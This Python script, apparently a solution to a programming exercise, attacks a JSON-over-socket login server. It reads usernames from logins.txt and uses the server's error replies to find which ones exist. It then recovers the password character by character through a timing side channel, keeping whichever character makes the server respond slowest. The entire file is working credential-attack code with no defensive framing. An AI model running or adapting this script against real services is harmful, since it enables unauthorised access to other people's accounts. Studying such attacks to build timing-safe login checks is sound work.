import sys
import socket
import string
import json
from datetime import datetime


def get_pass(login, letters=""):
    alpha = string.ascii_letters + string.digits
    differences = []
    exit_flag = False
    result = ''
    for ch in alpha:
        json_string1 = json.dumps({"login": login, "password": letters + ch})
        start = datetime.now()
        client_socket.send(json_string1.encode())
        response1 = client_socket.recv(1024)
        finish = datetime.now()
        response1 = response1.decode()
        decoded_data1 = json.loads(response1)
        difference = finish - start
        if decoded_data1["result"] == "Connection success!":
            exit_flag = True
            result = json_string1
            break
        differences.append((difference, ch))
    max_diff = max(differences)
    if not exit_flag:
        return get_pass(login, letters + max_diff[1])
    else:
        return result



args = sys.argv

host = args[1]
port = int(args[2])

client_socket = socket.socket()

address = (host, port)

client_socket.connect(address)

file = open("logins.txt", "r")
logins = file.read().splitlines()

file.close()

for login in logins:
    json_string = json.dumps({"login": login, "password": ""})
    client_socket.send(json_string.encode())
    response = client_socket.recv(1024)
    response = response.decode()
    decoded_data = json.loads(response)
    if decoded_data["result"] == "Wrong password!" or decoded_data["result"] == "Exception happened during login":
        print(get_pass(login))
        break

client_socket.close()
